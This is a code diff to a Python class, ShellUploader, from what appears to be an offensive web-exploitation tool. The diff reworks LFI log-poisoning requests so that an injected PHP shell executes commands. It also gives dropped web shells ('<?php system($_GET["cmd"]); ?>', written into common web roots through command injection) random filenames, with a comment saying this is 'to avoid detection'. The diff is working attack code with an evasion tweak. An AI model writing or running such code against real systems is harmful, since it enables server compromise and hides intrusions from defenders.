@@ -173,11 +173,18 @@ class ShellUploader:
             headers = {'User-Agent': shell_code}
             self.requester.request(url, 'GET', headers=headers)
             
-            # Try to include the poisoned log file
+            # Try to include the poisoned log file and execute a test command
             for log_path in log_paths:
-                data = {param: log_path}
-                test_url_with_cmd = f"{url}?cmd=echo+lfi_shell_test"
-                response = self.requester.request(test_url_with_cmd, 'GET', data=data)
+                # Build request with both the LFI param and cmd param in query string
+                from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
+                parsed = urlparse(url)
+                params = parse_qs(parsed.query)
+                params[param] = [log_path]
+                params['cmd'] = ['echo lfi_shell_test']
+                new_query = urlencode(params, doseq=True)
+                test_url = urlunparse(parsed._replace(query=new_query))
+                
+                response = self.requester.request(test_url, 'GET')
                 
                 if response and 'lfi_shell_test' in response.text:
                     print(f"{Colors.success(f'LFI shell via log poisoning: {log_path}')}")
@@ -204,12 +211,16 @@ class ShellUploader:
         url = finding.url
         param = finding.param
         
+        # Use a randomized shell filename to avoid detection
+        import uuid
+        shell_name = f"s{uuid.uuid4().hex[:8]}.php"
+        
         # Write a shell directly on the target using echo/printf
         shell_code = '<?php system($_GET["cmd"]); ?>'
         web_roots = ['/var/www/html', '/var/www', '/usr/share/nginx/html', '/srv/http']
         
         for web_root in web_roots:
-            shell_path = f"{web_root}/atomic_shell.php"
+            shell_path = f"{web_root}/{shell_name}"
             shell_commands = [
                 f"echo '{shell_code}' > {shell_path}",
                 f"printf '{shell_code}' > {shell_path}",
@@ -224,7 +235,7 @@ class ShellUploader:
                         # Verify the shell was written by trying to access it
                         from urllib.parse import urlparse
                         parsed = urlparse(url)
-                        shell_url = f"{parsed.scheme}://{parsed.netloc}/atomic_shell.php?cmd=echo+rce_shell_test"
+                        shell_url = f"{parsed.scheme}://{parsed.netloc}/{shell_name}?cmd=echo+rce_shell_test"
                         verify = self.requester.request(shell_url, 'GET')
                         
                         if verify and 'rce_shell_test' in verify.text:
